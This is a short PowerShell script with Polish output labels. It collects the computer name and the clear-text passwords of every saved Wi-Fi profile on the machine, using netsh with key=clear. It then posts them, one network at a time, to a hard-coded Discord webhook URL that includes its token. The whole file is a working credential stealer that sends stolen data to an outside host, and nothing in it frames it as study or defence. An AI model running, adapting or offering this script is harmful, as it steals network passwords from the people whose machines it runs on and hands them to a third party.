$date = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
$computerName = $env:COMPUTERNAME

$messageDate = "**Data:** $date"
$messageComputerName = "**Nazwa komputera:** $computerName"

# Send message to Discord webhook
$webhookUrl = "https://discord.com/api/webhooks/1081284102025658399/b2APTO7wXjpmnY_drIj-PrGS8M-XKN9sIDw6vorJ7nZ2ohAUnq0Gax-2TIzuByPBzAey"
$headers = @{
    "Content-Type" = "application/json"
}
$body = @{
    "content" = "$messageDate`n`n$messageComputerName`n`n"
} | ConvertTo-Json

Invoke-RestMethod -Method Post -Uri $webhookUrl -Headers $headers -Body $body

$wifiProfiles = netsh wlan show profiles | Select-String "All User Profile\s*: (.*)" | %{$_.Matches} | %{$_.Value -replace "All User Profile\s*: ",""}

foreach ($profile in $wifiProfiles) {
    $profileXML = netsh wlan show profile $profile key=clear | Out-String
    $wifiName = ($profileXML | Select-String "SSID Name\s*: (.*)").Matches.Value -replace "SSID Name\s*: "
    $password = ($profileXML | Select-String "Key Content\s*: (.*)").Matches.Value -replace "Key Content\s*: "

    # If password is empty or null, set it to "None"
    if ([string]::IsNullOrWhiteSpace($password)) {
        $password = "Siec nie posiada hasla"
    }

    $message = "`n**Nazwa Sieci:** $wifiName`n**Haslo:** $password"

    # Send message to Discord webhook
    $webhookUrl = "https://discord.com/api/webhooks/1081284102025658399/b2APTO7wXjpmnY_drIj-PrGS8M-XKN9sIDw6vorJ7nZ2ohAUnq0Gax-2TIzuByPBzAey"
    $headers = @{
        "Content-Type" = "application/json"
    }
    $body = @{
        "content" = "$message"
    } | ConvertTo-Json
    Invoke-RestMethod -Method Post -Uri $webhookUrl -Headers $headers -Body $body
}
